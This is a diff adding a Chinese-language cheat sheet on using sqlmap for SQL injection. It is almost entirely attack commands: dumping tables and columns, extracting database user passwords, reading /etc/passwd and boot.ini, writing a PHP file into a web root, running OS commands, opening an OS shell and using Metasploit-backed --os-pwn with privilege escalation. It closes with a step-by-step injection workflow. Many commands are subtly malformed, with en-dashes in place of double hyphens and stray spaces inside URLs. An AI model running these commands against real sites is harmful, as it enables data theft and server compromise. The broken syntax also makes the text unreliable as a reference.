@@ -1,0 +1,138 @@
+
+.. _security.nmap.base:
+
+======================================================================================================================================================
+sqlmap基本使用
+======================================================================================================================================================
+
+:Date: 2019-3
+
+.. contents::
+
+
+sqlmap简单实用
+======================================================================================================================================================
+
+
+
+
+
+- 在网页后面添加 ``'`` 测试
+- 在网页后面添加 ``and 1=2`` 测试
+
+查询链接的服务器使用的什么数据库：
+    - sqlmap -u http://xxxxxx.com/xxx.asp?ID=xxxx --dbs --current-user
+    - 会测试出服务器系统/web服务器类型/数据库类型
+
+查询数据库中的表名称：
+    - sqlmap -u http://xxxxxx.com/xxx.asp?ID=xxxx --tables
+    - 这一步可能会根据sqlmap的字典来猜测数据库中表的名称
+
+查询数据库中指定表(这里表明uname)的列名称：
+    - sqlmap -u http://xxxxxx.com/xxx.asp?ID=xxxx -T uname --columns
+
+查询数据库中指定表(这里表明uname)的指定列（username,password,login_name）的数据：
+    - sqlmap -u http://xxxxxx.com/xxx.asp?ID=xxxx -T uname -C username,password,login_name --dump
+
+
+
+
+常用语句
+1.
+./sqlmap.py -u http://www.91ri.org/ test.php?p=2 -f -b –current-user –current-db –users –passwords –dbs -v 0
+2.
+./sqlmap.py -u http://www.91ri.org/ test.php?p=2 -b –passwords -U root –union-use -v 2
+3.
+./sqlmap.py -u http://www.91ri.org/ test.php?p=2 -b –dump -T users -C username -D userdb –start 2 –stop 3 -v 2
+4.
+./sqlmap.py -u http://www.91ri.org/ test.php?p=2 -b –dump -C “user,pass” -v 1 –exclude-sysdbs
+5.
+./sqlmap.py -u http://www.91ri.org/ test.php?p=2 -b –sql-shell -v 2
+6.
+./sqlmap.py -u http://www.91ri.org/ test.php?p=2 -b –file-read “c:\boot.ini” -v 2
+7.
+./sqlmap.py -u http://www.91ri.org/ test.php?p=2 -b –file-write /test/test.txt –file-dest /var/www/html/1.txt -v 2
+8.
+./sqlmap.py -u http://www.91ri.org/ test.php?p=2 -b –os-cmd “id” -v 1
+9.
+./sqlmap.py -u http://www.91ri.org/ test.php?p=2 -b –os-shell –union-use -v 2
+10.
+./sqlmap.py -u http://www.91ri.org/ test.php?p=2 -b –os-pwn –msf-path=/opt/framework/msf3 –priv-esc -v 1
+11.
+./sqlmap.py -u http://www.91ri.org/ test.php?p=2 -b –os-pwn –msf-path=/opt/framework/msf3 -v 1
+12.
+./sqlmap.py -u http://www.91ri.org/ test.php?p=2 -b –os-bof –msf-path=/opt/framework/msf3 -v 1
+13.
+./sqlmap.py -u http://www.91ri.org/ test.php?p=2 –reg-add –reg-key=”HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap” –reg-value=Test –reg-type=REG_SZ –reg-data=1
+14.
+./sqlmap.py -u http://www.91ri.org/ test.php?p=2 -b –eta
+15.
+./sqlmap.py -u “http://www.91ri.org/ sqlmap/mysql/get_str_brackets.php?id=1″ -p id –prefix “‘)” –suffix “AND (‘abc’='abc”
+16.
+./sqlmap.py -u “http://www.91ri.org/ sqlmap/mysql/basic/get_int.php?id=1″ –auth-type Basic –auth-cred “testuser:testpass”
+17.
+./sqlmap.py -l burp.log –scope=”(www)?\.target\.(com|net|org)”
+18.
+./sqlmap.py -u “http://www.91ri.org/ sqlmap/mysql/get_int.php?id=1″ –tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3
+19.
+./sqlmap.py -u “http://www.91ri.org/ sqlmap/mssql/get_int.php?id=1″ –sql-query “SELECT ‘foo’” -v 1
+20.
+./sqlmap.py -u “http://www.91ri.org/ mysql/get_int_4.php?id=1″ –common-tables -D testdb –banner
+
+简单的注入流程
+
+1.读取数据库版本，当前用户，当前数据库
+
+sqlmap -u http://www.91ri.org/ test.php?p=2 -f -b –current-user –current-db -v 1
+
+2.判断当前数据库用户权限
+
+sqlmap -u http://www.91ri.org/ test.php?p=2 –privileges -U 用户名 -v 1
+sqlmap -u http://www.91ri.org/ test.php?p=2 –is-dba -U 用户名 -v 1
+
+3.读取所有数据库用户或指定数据库用户的密码
+
+sqlmap -u http://www.91ri.org/ test.php?p=2 –users –passwords -v 2
+sqlmap -u http://www.91ri.org/ test.php?p=2 –passwords -U root -v 2
+
+4.获取所有数据库
+
+sqlmap -u http://www.91ri.org/ test.php?p=2 –dbs -v 2
+
+5.获取指定数据库中的所有表
+
+sqlmap -u http://www.91ri.org/ test.php?p=2 –tables -D mysql -v 2
+
+6.获取指定数据库名中指定表的字段
+
+sqlmap -u http://www.91ri.org/ test.php?p=2 –columns -D mysql -T users -v 2
+
+7.获取指定数据库名中指定表中指定字段的数据
+
+sqlmap -u http://www.91ri.org/ test.php?p=2 –dump -D mysql -T users -C “username,password” -s “sqlnmapdb.log” -v 2
+
+8.file-read读取web文件
+
+sqlmap -u http://www.91ri.org/ test.php?p=2 –file-read “/etc/passwd” -v 2
+
+9.file-write写入文件到web
+
+sqlmap -u http://www.91ri.org/ test.php?p=2 –file-write /localhost/mm.php –file-dest /var/www/html/xx.php -v 2
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
